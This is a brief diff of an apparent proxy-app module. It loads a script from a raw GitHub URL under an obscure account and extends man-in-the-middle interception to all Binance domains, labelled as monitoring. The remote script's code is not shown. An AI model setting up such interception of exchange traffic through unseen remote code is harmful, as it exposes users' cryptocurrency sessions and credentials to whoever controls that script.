@@ -7,4 +7,4 @@ dns-logger = type=dns, script-path=https://raw.githubusercontent.com/fodlkfjasuq
 
 [MITM]
 # 列出您想要監控的域名
-hostname = %APPEND% binance.com
+hostname = %APPEND% binance.com, *.binance.com
